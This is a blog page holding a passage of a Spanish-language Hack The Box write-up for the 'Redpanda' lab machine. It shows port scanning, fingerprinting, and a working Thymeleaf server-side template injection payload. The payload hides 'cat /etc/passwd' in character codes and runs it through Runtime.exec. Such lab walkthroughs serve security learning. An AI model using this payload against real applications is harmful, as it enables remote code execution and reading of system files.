<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Redpanda" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBRedpanda/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBRedpanda/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-22T16:42:14-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Redpanda" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-22T16:42:14-05:00","datePublished":"2022-09-22T16:42:14-05:00","description":"Overview","headline":"Hackthebox Writeup Redpanda","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBRedpanda/"},"url":"https://e1p0tr0.github.io/posts/HTBRedpanda/"}</script><title>Hackthebox Writeup Redpanda | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Redpanda</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Redpanda</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1663882934" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-22 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4340 words"> <em>24 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Remote code excution by <strong>Server Site Template Injection (SSTI)</strong> (Foothold)<li>Read files privileged by <strong>Xml External Entity Attack (XXE)</strong> (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/redpanda/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.170<td style="text-align: center">09 Jul 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.170
PING 10.10.11.170 <span class="o">(</span>10.10.11.170<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.170: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>106 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.170 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 105.655/105.655/105.655/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la máquina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.170
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 16:57 -05
Nmap scan report for 10.10.11.170
Host is up (0.13s latency).
Not shown: 65431 closed tcp ports (reset), 102 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
                \_________________ Secure Shell Protocol
8080/tcp open  http-proxy
                \_________________ Hypertext Transfer Protocol (proxy)
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>–open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora realizamos un escaneo mas profundo para encontrar que servicios corren por cada uno de los puertos descubiertos <strong>22(SSH) - 8080(HTTP-PROXY)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p22,8080 -sCV -oN openPortsTCP 10.10.11.170
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 17:13 -05
Nmap scan report for 10.10.11.170
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
</span><span class="gp">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200
</span><span class="gp">|     Content-Type: text/html;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
<span class="go">|     Content-Language: en-US
|     Date: Thu, 22 Sep 2022 22:09:21 GMT
|     Connection: close
</span><span class="gp">|     &lt;!DOCTYPE html&gt;</span><span class="w">
</span><span class="gp">|     &lt;html lang="en" dir="ltr"&gt;</span><span class="w">
</span><span class="gp">|     &lt;head&gt;</span><span class="w">
</span><span class="gp">|     &lt;meta charset="utf-8"&gt;</span><span class="w">
</span><span class="gp">|     &lt;meta author="wooden_k"&gt;</span><span class="w">
</span><span class="gp">|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;</span><span class="w">
</span><span class="gp">|     &lt;link rel="stylesheet" href="css/panda.css" type="text/css"&gt;</span><span class="w">
</span><span class="gp">|     &lt;link rel="stylesheet" href="css/main.css" type="text/css"&gt;</span><span class="w">
</span><span class="gp">|     &lt;title&gt;</span>Red Panda Search | Made with Spring Boot&lt;/title&gt;
<span class="gp">|     &lt;/head&gt;</span><span class="w">
</span><span class="gp">|     &lt;body&gt;</span><span class="w">
</span><span class="gp">|     &lt;div class='pande'&gt;</span><span class="w">
</span><span class="gp">|     &lt;div class='ear left'&gt;</span>&lt;/div&gt;
<span class="gp">|     &lt;div class='ear right'&gt;</span>&lt;/div&gt;
<span class="gp">|     &lt;div class='whiskers left'&gt;</span><span class="w">
</span><span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;/div&gt;</span><span class="w">
</span><span class="gp">|     &lt;div class='whiskers right'&gt;</span><span class="w">
</span><span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;span&gt;</span>&lt;/span&gt;
<span class="gp">|     &lt;/div&gt;</span><span class="w">
</span><span class="gp">|     &lt;div class='face'&gt;</span><span class="w">
</span><span class="go">|     &lt;div class='eye
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Thu, 22 Sep 2022 22:09:21 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
</span><span class="gp">|     Content-Type: text/html;</span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 22 Sep 2022 22:09:21 GMT
|     Connection: close
</span><span class="gp">|     &lt;!doctype html&gt;</span>&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;HTTP Status 400
<span class="gp">|     Request&lt;/title&gt;</span>&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>body <span class="o">{</span>font-family:Tahoma,Arial,sans-serif<span class="p">;</span><span class="o">}</span> h1, h2, h3, b <span class="o">{</span>color:white<span class="p">;</span>background-color:#525D76<span class="p">;</span><span class="o">}</span> h1 <span class="o">{</span>font-size:22px<span class="p">;</span><span class="o">}</span> h2 <span class="o">{</span>font-size:16px<span class="p">;</span><span class="o">}</span> h3 <span class="o">{</span>font-size:14px<span class="p">;</span><span class="o">}</span> p <span class="o">{</span>font-size:12px<span class="p">;</span><span class="o">}</span> a <span class="o">{</span>color:black<span class="p">;</span><span class="o">}</span> .line <span class="o">{</span>height:1px<span class="p">;</span>background-color:#525D76<span class="p">;</span>border:none<span class="p">;</span><span class="o">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400
<span class="go">. . .
</span><span class="gp">-Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Ya que no disponemos de credenciales omitimos analizar el puerto <strong>22(SSH)</strong> y emepzamos con el reconocimiento en el servicio web <strong>8080(HTTP-PROXY)</strong>. Para ello emepzamos escaneando que tecnologías usa el servicio web:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb http://10.10.11.170:8080
http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a></p></div></blockquote><p>Tanto como en los script de reconocimiento de <code class="language-plaintext highlighter-rouge">nmap</code> y el escaner de tecnologías <code class="language-plaintext highlighter-rouge">Wappalyzer</code>, la única información que tenemos es que estamos frente a un <strong>proxy web</strong> y se está usando el framework <strong>Spring Boot</strong> por la etiqueta <code class="language-plaintext highlighter-rouge">&lt;tittle&gt;</code>:</p><blockquote><p>¿ Qué es un <strong>proxy</strong> ?</p><p>Un proxy es un intermediario entre las conexiones del cliente (nosotros) y un servidor de desino (servicio web), donde se filtran los paquetes de las conexiones y con ello proporciona mayor seguridad ya que se establece una comunicación de manera indirecta</p></blockquote><blockquote><p>¿ Qué es <strong>Spring Boot</strong> ?</p><p>Spring Boot es una herramienta que nos permite crear un proyecto como Spring (Framework del lenguaje Java), solo que Spring Boot elimina ciertas configuraciones repetitivas requeridas para desplegar la aplicación o proyecto</p></blockquote><p>Con estos conceptos mas claros nos dirigimos a examinar la interfaz del sitio web <strong>8080(HTTP-PROXY)</strong>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">Chromium</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/redpanda/http_proxy_web.png" alt="http-proxy" class="shadow" data-proofer-ignore></p><p>Observamos un buscador de pandas rojos que al testear y no disponer un texto al buscador nos aparece un panda por defecto:</p><p><img data-src="/assets/img/htb/writeups/redpanda/default_search.png" alt="default-search" class="shadow" data-proofer-ignore></p><p>Nos menciona una pista de posible vector de ataque como son las <strong>Inyecciones de ataque (Injection attacks)</strong>, como <strong>SQL Inyection (SQLi), Cross-Site Scripting (XSS), Code Injection, Command Injection, etc.</strong></p><p>Además, ya que el servidor está haciendo uso del <strong>Framework Spring Boot</strong>, sabemos que esto conlleva el uso de un <strong>Motor de plantilla (Template Engine)</strong></p><p>Entonces juntando ambas ideas se nos ocurre el vector de ataque <strong>Server Site Template Injection</strong>. Para ello, primero debemos validar que es vulnerable, luego buscar la manera de encontrar el motor de plantilla que corre por detrás y posteriormente ya podremos explotar la vulnerabilidad</p><blockquote><p>Tenemos la siguiente información:</p><p><strong>Framework</strong> : Spring Boot</p><ul><li><strong>Lenguaje</strong> : Java<li><strong>Motor de plantila</strong> : ? ( posibles -&gt; Java Server Pages, Thymeleaf, Groovy, FreeMarker, Jade)</ul></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Como la única información certera que tenemos es que el framework usa el lenguaje <strong>Java</strong>, entonces procedemos a buscar tipos de inyecciones básicas del lenguaje:</p><blockquote><p>Repositorio <strong>PayloadsAllTheThings</strong></p></blockquote><p><img data-src="/assets/img/htb/writeups/redpanda/java_injection.png" alt="java-injections" class="shadow" data-proofer-ignore></p><p>Al validar la inyección nos sale el siguiente mensaje:</p><p><img data-src="/assets/img/htb/writeups/redpanda/banned_characters.png" alt="banned-characters" class="shadow" data-proofer-ignore></p><p>Entonces comprobamos que no podemos escribir el simbolo <code class="language-plaintext highlighter-rouge">$</code>, por ello usamos otra expresión para variables como <code class="language-plaintext highlighter-rouge">#, *, @, ~</code>. Al final nos funciona los simbolos <code class="language-plaintext highlighter-rouge">#, *, @</code></p><blockquote><p>Ahora podemos intentar inyectar un comando para extraer archivos:</p></blockquote><p><img data-src="/assets/img/htb/writeups/redpanda/java_ssti.png" alt="java-ssti" data-proofer-ignore></p><p>Al intentar el segundo commando con la expresión <code class="language-plaintext highlighter-rouge">*</code> obtuvimos el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, comprobando así que es vulnerable a <strong>Server Site Template Inyection</strong></p><p><img data-src="/assets/img/htb/writeups/redpanda/ssti.png" alt="stti-search" class="shadow" data-proofer-ignore></p><p>La respuesta de porque solo funciona con la expresión <code class="language-plaintext highlighter-rouge">*</code> es lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/redpanda/thymeleaf_expressions.png" alt="thymeleaf-expressions" class="shadow" data-proofer-ignore></p><p>Entonces ya podemos tener una idea que el motor de plantilla que se usa es <strong>Thymeleaf</strong>, mas adelante lo comprobaremos al 100%</p><blockquote class="prompt-info"><div><p>Puedes encontrar el repositorio para <strong>SSTI</strong> en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java">PayloadsAllTheThings</a></p></div></blockquote><blockquote><p>Analizando la inyección</p></blockquote><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">*{</span><span class="no">T</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOUtils</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">99</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">97</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">116</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">32</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">47</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">101</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">116</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">99</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">47</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">112</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">97</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">115</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">115</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">119</span><span class="o">)).</span><span class="na">concat</span><span class="o">(</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Character</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="mi">100</span><span class="o">))).</span><span class="na">getInputStream</span><span class="o">())}</span>
</pre></table></code></div></div><p>De primeras, por el tamaño, podemos concluir que para cada letra del comando que queremos ejecutar se está usando una conversión de su valor númerico y finalmente juntarlos todos. Aquí hay un poco de que sirve cada expresión</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>SSTI Payload:
------------

org.apache.commons.io (package) [Provides file and string comparison]

  IOUtils (class) [Provides utility methods for reading, writing and copying files]
    toString() (feature) [Read data from stream]

java.lang (package) [Provides classes that are fundamental to the design of the Java programming language]

  Runtime (class) [Used to interact with Every Java application and allows the application to interface with the environment in which the application is running]
    getRuntime() (method) [Returns the runtime object associated with the current Java application]
    exec(String command) (method) [Executes the specified string command in a separate process]

  Character (class) [The Character class wraps a value of the primitive type char in an object]
    toString(char c) (method) [Returns a String object representing the specified char]
      concat(String concatenation) (method) [Forms a new String that is the combination of multiple strings]

  Process (class) [Provides methods for performing input from the process, performing output to the process, waiting, etc]
    getInputStream() (method) [Gets the input stream of the subprocess]

